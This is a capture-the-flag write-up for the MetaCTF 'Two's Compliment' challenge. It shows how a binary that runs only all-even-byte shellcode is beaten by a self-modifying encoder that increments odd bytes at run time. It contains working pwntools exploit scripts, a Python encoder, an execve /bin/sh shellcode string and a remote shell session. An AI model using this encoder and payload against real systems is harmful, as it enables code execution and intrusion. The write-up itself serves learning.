# Two's Compliment

The description for this challenge is as follows:

*Seven ate six*

*After seven ate six, it thought to itself, "After I ate nine my mouth felt numb, but this time it's even number".*

*nc host1.metaproblems.com 5480*

*Two_Compliment*

This challenge was worth 250 points, and it only had 31 solves at the end of
the competition. I found it fairly difficult since I ended up manually writing
shellcode to fit some extremely tight restrictions, although it is absolutely
possible that there are easier methodologies! Nevertheless, I do feel like
this method is, at minimum, a good learning exercise.

The challenge came with a zip file that included the original binary as well
as a docker setup. Personally, I simply ran the binary by itself and did not
touch the docker image, and it seemed to work fine.

**TL:;DR Solution:** Reverse engineer the binary to discover that it will run
whatever shellcode you give it, but only if that shellcode consists
exclusively of even-numbered bytes. Note that the rax and rdx registers are
set to the start of the mmapped region that stores our shellcode, and the
instructuction "mov al, some even number", "inc al", and "inc BYTE PTR
ds:[rax];" (and the equivalents for rdx) use only even-numbered bytes. Use
these instructions to move within the shellcode's mmapped space and edit
instructions to allow for odd bytes, which gives us arbitrary shellcode
execution.

## Original Writeup Link

This writeup is also available on my GitHub! View it there via this link:
https://github.com/knittingirl/CTF-
Writeups/tree/main/pwn_challs/MetaCTF21/Two's_Compliment

## Gathering Information

As usual, my first step is to try running the binary. The program requests
some shellcode, and if I try to just enter a bunch of a's, it says Bad
Character found.  
```  
knittingirl@piglet:~/CTF/metaCTF21/twos_compliment$ ./two  
What is your shellcode?  
aaaaaaaaaaaaaaa  
Bad Character found  
```  
If I run checksec on the binary, I can see that NX is enabled. This seems odd
if it is executing shellcode, so I can deduce that the program is either
mmapping an RWX section of memory when it runs, or the prompt is just lying!  
```  
knittingirl@piglet:~/CTF/metaCTF21/twos_compliment$ checksec two  
[*] '/home/knittingirl/CTF/metaCTF21/twos_compliment/two'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```  
If I open up the program in Ghidra and look at the main function, I can see
that the mmapping theory is definitely corect. A 0x1000 byte-long section of
memory is carved out at 0x133713370000, and it is given rwx permissions (this
is determined by the 7 in the third argument, just like "chmod 777 filename"
in the Linux terminal provides rwx permissions). The disassembly from there is
a bit messy, but the line "(*(code *)((long)len + 0x133713370000))();" is a
pretty strong indicator that it is trying to execute shellcode. It also looks
like the user input is getting read into that section directly, so there is no
chance of a stack-based buffer overflow.

```  
undefined8 main(void)

{  
 int iVar1;  
 void *pvVar2;  
 ssize_t sVar3;  
 int shellcode_length;  
  
 setvbuf(stdout,(char *)0x0,2,0);  
 setvbuf(stdin,(char *)0x0,2,0);  
 puts("What is your shellcode?");  
 pvVar2 = mmap((void *)0x133713370000,0x1000,7,0x32,-1,0);  
 if (pvVar2 != (void *)0x133713370000) {  
   puts("mmap failed");  
                   /* WARNING: Subroutine does not return */  
   exit(-1);  
 }  
 iVar1 = len;  
 if (len < 0) {  
   iVar1 = len + 7;  
 }  
                   /* I have 0x800 of input. That should be very sufficient */  
 sVar3 = read(0,(void *)((long)(iVar1 >> 3) * 8 + 0x133713370000),0x800);  
 shellcode_length = (int)sVar3;  
 if (*(char *)((long)shellcode_length + (long)len + 0x13371336ffff) == '\n') {  
   shellcode_length = shellcode_length + -1;  
   *(undefined *)((long)len + (long)shellcode_length + 0x133713370000) = 0;  
 }  
 iVar1 = check((byte *)((long)len + 0x133713370000),shellcode_length + -1);  
 if (iVar1 != 0) {  
   puts("Bad Character found");  
                   /* WARNING: Subroutine does not return */  
   exit(-1);  
 }  
 (*(code *)((long)len + 0x133713370000))();  
 return 0;  
}  
```  
Before the program tries to execute the shellcode, however, it calls the
check() function on that input. If the check fails, it prints "Bad Character
found" and exits, like we saw in my initial test scenario. Once it's cleaned
up slightly, the check() function is fairly straightforward. It takes the
shellcode that I am trying to execute and, starting from the last character,
it performs a bytewise on each with 1 and checks the result. If the result is
ever 1, the function returns 1, if not, it returns 0. ANDing a byte with 1 is
an odd-or-even checker; bytes that produce 1 are odd, and if we look back at
the main function, the check fails if it does not return 0. As a result, the
shellcode that we pass to the program must consist entirely of even-numbered
bytes.

```  
undefined8 check(byte *my_shellcode,int shellcode_length)

{  
 long current_byte;  
 int i;  
  
 i = shellcode_length;  
 do {  
   if (i < 0) {  
     return 0;  
   }  
   current_byte = (long)i;  
   i = i + -1;  
 } while ((my_shellcode[current_byte] & 1) == 0);  
 return 1;  
}  
```  
## Planning the Exploit:

My ultimate goal is to string a shellcode together that will set rax to 0x3b,
rdi to a /bin/sh string, rsi and rdx to 0, and call a syscall. Most of this
will require odd bytes, for example, x86-64 shellcode for syscall is
'\x0f\x05', so two odd bytes.

I will note here that tools like msfvenom and pwntools do include shellcode
encoders that can create shellcodes without certain bad bytes; i.e., you can
generate a shellcode without any null bytes. However, I fiddled with both
encoders for a bit, and I simply was not able to generate shellcodes without
any of the odd-numbered bytes, probably because there were simply too many
that disallowed very basic instructions like syscall.

My basic game plan was to come up with a few allowed instructions, then use
them to edit various bytes within my shellcode space in order to create the
instructions I want with odd bytes.  One important consideration was to see
what registers would contain by default when my shellcode started running; I
ran the program in GDB/GEF, set a breakpoint at main+363, which is the call
instruction for my shellcode, and checked the register contents. I was
particularly interested by the fact that rax, rdx, and rdi contain the
addresses for the start of my shellcode. As a result, my plan is to see if,
with any one of the registers, I can iterate/move their values upward to point
to specific spots in the shellcode chunk, as well as iterate/move the values
pointed to by these registers, which will be my actual shellcode.  
```  
$rax   : 0x0000133713370000  →  "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"  
$rbx   : 0x0  
$rcx   : 0x0  
$rdx   : 0x0000133713370000  →  "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"  
$rsp   : 0x00007fffffffdfa0  →  0x0000555555555330  →  <__libc_csu_init+0>
push r15  
$rbp   : 0x00007fffffffdfc0  →  0x0000555555555330  →  <__libc_csu_init+0>
push r15  
$rsi   : 0x1e  
$rdi   : 0x0000133713370000  →  "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"  
$rip   : 0x000055555555531e  →  <main+363> call rax  
$r8    : 0xffffffff  
$r9    : 0x0  
$r10   : 0x00007ffff7fef7e0  →  <strcmp+2864> pxor xmm0, xmm0  
$r11   : 0x246  
$r12   : 0x0000555555555090  →  <_start+0> xor ebp, ebp  
$r13   : 0x0  
$r14   : 0x0  
$r15   : 0x0  
```  
To test instructions, I used pwntools' shellcode assembler with trial and
error in a python terminal. You need to make sure that the context
architecture is 'amd64', then you can try various instructions and see the
results. Here is a selection of the most relevant, allowed
instructions/patterns; please note that attempts to move an odd number into a
register will not work, and you will be better off moving in the target value
- 1, then performing an inc to iterate it up by one:  
```  
>>> from pwn import *  
>>> context.clear(arch='amd64')  
>>> asm('mov eax, 2')  
b'\xb8\x02\x00\x00\x00'  
>>> asm('mov edx, 2')  
b'\xba\x02\x00\x00\x00'  
>>> asm('mov al, 2')  
b'\xb0\x02'  
>>> asm('mov dl, 2')  
b'\xb2\x02'  
>>> asm('inc al')  
b'\xfe\xc0'  
>>> asm('inc dl')  
b'\xfe\xc2'  
>>> asm('inc BYTE PTR ds:[rax];')  
b'\xfe\x00'  
>>> asm('inc BYTE PTR ds:[rdx];')  
b'\xfe\x02'  
```  
As a proof of concept, I first attempted to just make a syscall to see if it
would work. The basic idea is that for each odd byte in the non-workable
instruction, I will instead enter in that byte - 1. Then I move the rax (or
rdx) register up to the spot of shellcode where that byte is positioned, and
iterate the contents up with an inc instruction. Here is the basic script to
pull this off:  
```  
from pwn import *

target = process('./two')

pid = gdb.attach(target, "\nb *main+363\n set disassembly-flavor
intel\ncontinue")

#target = remote('host1.metaproblems.com', 5480)

print(target.recvuntil(b'What is your shellcode?'))

context.clear(arch='amd64')

shellcode = asm('''  
mov al, 8;  
inc BYTE PTR ds:[rax];  
inc al;  
inc BYTE PTR ds:[rax];  
''')

#The actual syscall shellcode is b'\x0f\x05'  
shellcode += b'\x0e\x04'

print(shellcode)

target.sendline(shellcode)

target.interactive()  
```  
Here is what the shellcode looks like in GDB/GEF when I initially start to
execute it:  
```  
→ 0x133713370000                  mov    al, 0x8  
  0x133713370002                  inc    BYTE PTR [rax]  
  0x133713370004                  inc    al  
  0x133713370006                  inc    BYTE PTR [rax]  
  0x133713370008                  (bad)  
  0x133713370009                  add    al, 0x0  
```  
And here it appears after both inc's have been performed:  
```  
→ 0x133713370008                  syscall  
  0x13371337000a                  add    BYTE PTR [rax], al  
  0x13371337000c                  add    BYTE PTR [rax], al  
```  
I can effectively write whatever shellcode I want at this point, albeit it in
a slightly more time-consuming fashion.

## Writing the Exploit:

During the competition window, I manually put together each instruction in a
very similar manner to that described above for the syscall. I also designed
my own binsh shellcode to include as few odd bytes as possible. However, I
have since written a helper function in an attempt to streamline the process
and make it easier to encode arbitrary shellcode in this and similar fashions.

The basic idea is to create an encoding function in python to automatically
scan through any provided shellcode, pick out odd bytes, switch them to
smaller, even bytes, and place some appropriate encoding shellcode at the
beginning in order to bring rax up to the byte and add one to the contents
during run-time. I also place a padding of nops in between the end of my
encoding shellcode and the beginning of my binsh shellcode in order to start
the binsh shellcode at a consistent location and make the function easier to
write. I could probably do without this padding if length constraints were
tighter, but as it stands, I have more than enough space and it made the
encoding function easier to write.

This encoding function could easily deal with longer and more complicated
shellcode, as long as it fits within the desired parameters. I could also
optimize it further to include less unnecessary mov instructions,
automatically come up with smaller NOP offsets, and more, but for the purposes
of this exercise, it works really well, and it could probably be edited to
work with different shellcode restrictions.

Here is the actual final script:  
```  
from pwn import *

#target = process('./two')

#pid = gdb.attach(target, "\nb *main+363\n set disassembly-flavor
intel\ncontinue")

target = remote('host1.metaproblems.com', 5480)

print(target.recvuntil(b'What is your shellcode?'))

context.clear(arch='amd64')

def encode(goal_shellcode, starting_position):  
	evened_shellcode = b''  
	encoder_shellcode = b''  
	current_position = starting_position  
	for i in range(len(goal_shellcode)):  
		current_byte_num = goal_shellcode[i]  
		if current_byte_num % 2 == 1:  
			evened_shellcode += (current_byte_num - 1).to_bytes(1, 'little')  
			if current_position % 2 == 0:  
				encoder_shellcode += asm('mov al, ' + str(current_position) + ''';  
				inc BYTE PTR ds:[rax];''')  
			else:  
				encoder_shellcode += asm('mov al, ' + str(current_position - 1) + ''';  
				inc al;  
				inc BYTE PTR ds:[rax];''')  
  
		else:  
			evened_shellcode += goal_shellcode[i].to_bytes(1, 'little')  
		current_position += 1  
	final_shellcode = encoder_shellcode + asm('NOP;') * (starting_position - len(encoder_shellcode)) + evened_shellcode  
	return final_shellcode

starting_position = 0x80

#Credit to http://shell-storm.org/shellcode/files/shellcode-806.php for the
pre-prepared binsh shellcode.  
goal_shellcode =
b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

shellcode = encode(goal_shellcode, starting_position)

print(shellcode)  
print(disasm(shellcode))

target.sendline(shellcode)

target.interactive()  
```  
And here is the output, with some of the disassembled NOPs removed for
clarity:  
```  
knittingirl@piglet:~/CTF/metaCTF21/twos_compliment$ python3
two_compliment_writeup.py  
[+] Opening connection to host1.metaproblems.com on port 5480: Done  
b'What is your shellcode?'  
b'\xb0\x80\xfe\x00\xb0\x82\xfe\xc0\xfe\x00\xb0\x84\xfe\x00\xb0\x84\xfe\xc0\xfe\x00\xb0\x86\xfe\xc0\xfe\x00\xb0\x8a\xfe\x00\xb0\x8a\xfe\xc0\xfe\x00\xb0\x8c\xfe\xc0\xfe\x00\xb0\x8e\xfe\x00\xb0\x8e\xfe\xc0\xfe\x00\xb0\x90\xfe\xc0\xfe\x00\xb0\x92\xfe\x00\xb0\x94\xfe\x00\xb0\x98\xfe\x00\xb0\x98\xfe\xc0\xfe\x00\xb0\x9a\xfe\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x900\xc0H\xba\xd0\x9c\x96\x90\xd0\x8c\x96\xfeH\xf6\xdaRT^\x98RVT^\xb0:\x0e\x04'  
  0:   b0 80                   mov    al, 0x80  
  2:   fe 00                   inc    BYTE PTR [rax]  
  4:   b0 82                   mov    al, 0x82  
  6:   fe c0                   inc    al  
  8:   fe 00                   inc    BYTE PTR [rax]  
  a:   b0 84                   mov    al, 0x84  
  c:   fe 00                   inc    BYTE PTR [rax]  
  e:   b0 84                   mov    al, 0x84  
 10:   fe c0                   inc    al  
 12:   fe 00                   inc    BYTE PTR [rax]  
 14:   b0 86                   mov    al, 0x86  
 16:   fe c0                   inc    al  
 18:   fe 00                   inc    BYTE PTR [rax]  
 1a:   b0 8a                   mov    al, 0x8a  
 1c:   fe 00                   inc    BYTE PTR [rax]  
 1e:   b0 8a                   mov    al, 0x8a  
 20:   fe c0                   inc    al  
 22:   fe 00                   inc    BYTE PTR [rax]  
 24:   b0 8c                   mov    al, 0x8c  
 26:   fe c0                   inc    al  
 28:   fe 00                   inc    BYTE PTR [rax]  
 2a:   b0 8e                   mov    al, 0x8e  
 2c:   fe 00                   inc    BYTE PTR [rax]  
 2e:   b0 8e                   mov    al, 0x8e  
 30:   fe c0                   inc    al  
 32:   fe 00                   inc    BYTE PTR [rax]  
 34:   b0 90                   mov    al, 0x90  
 36:   fe c0                   inc    al  
 38:   fe 00                   inc    BYTE PTR [rax]  
 3a:   b0 92                   mov    al, 0x92  
 3c:   fe 00                   inc    BYTE PTR [rax]  
 3e:   b0 94                   mov    al, 0x94  
 40:   fe 00                   inc    BYTE PTR [rax]  
 42:   b0 98                   mov    al, 0x98  
 44:   fe 00                   inc    BYTE PTR [rax]  
 46:   b0 98                   mov    al, 0x98  
 48:   fe c0                   inc    al  
 4a:   fe 00                   inc    BYTE PTR [rax]  
 4c:   b0 9a                   mov    al, 0x9a  
 4e:   fe 00                   inc    BYTE PTR [rax]  
 50:   90                      nop  
...  
 7f:   90                      nop  
 80:   30 c0                   xor    al, al  
 82:   48 ba d0 9c 96 90 d0    movabs rdx, 0xfe968cd090969cd0  
 89:   8c 96 fe  
 8c:   48 f6 da                rex.W neg dl  
 8f:   52                      push   rdx  
 90:   54                      push   rsp  
 91:   5e                      pop    rsi  
 92:   98                      cwde  
 93:   52                      push   rdx  
 94:   56                      push   rsi  
 95:   54                      push   rsp  
 96:   5e                      pop    rsi  
 97:   b0 3a                   mov    al, 0x3a  
 99:   0e                      (bad)  
 9a:   04                      .byte 0x4  
[*] Switching to interactive mode

$ ls  
flag.txt  
two  
two.sh  
$ cat flag.txt  
MetaCTF{eVEn_evEN_8y7e5_c4N_re4cH_0Dd_Re9157eRs}  
$  
```  
Thanks for reading!